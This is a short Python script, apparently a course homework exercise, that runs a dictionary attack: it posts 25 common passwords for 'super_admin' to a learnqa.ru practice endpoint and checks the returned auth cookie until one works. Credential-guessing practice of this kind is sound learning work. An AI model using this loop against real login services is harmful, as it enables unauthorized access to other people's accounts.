import requests

passwords = ['123456', '123456789', 'qwerty', 'password', '1234567', '12345678', '12345', 'iloveyou', '111111',
             '123123', 'abc123', 'qwerty123', '1q2w3e4r', 'admin', 'qwertyuiop', '654321', '555555', 'lovely',
             '7777777', 'welcome', '888888', 'princess', 'dragon', 'password1', '123qwe']

for password in passwords:
    payload = {"login":"super_admin", "password": password}
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)

    cookie_value = response.cookies.get('auth_cookie')
    cookies={}
    cookies.update({'auth_cookie': cookie_value})

    response_check = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
    response_check_text = response_check.text
    if response_check_text == "You are authorized":
        print(f"Верный пароль: {password}\nОтвет сервера: {response_check_text}")
        break
